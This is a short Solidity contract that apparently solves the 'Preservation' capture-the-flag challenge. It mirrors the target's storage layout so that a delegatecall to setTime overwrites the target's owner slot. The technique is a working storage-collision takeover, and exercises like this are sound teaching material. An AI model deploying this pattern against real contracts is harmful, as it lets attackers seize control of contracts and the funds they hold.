//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationSolution {
    // owner is on storage slot 3 on the Preservation contract
    uint256 public notRelevant;
    uint256 public AlsoNotRelevant;

    uint public addressOnStorageSlotThree;

    function setTime(uint _newOwner) external {
        addressOnStorageSlotThree = _newOwner;
    }
}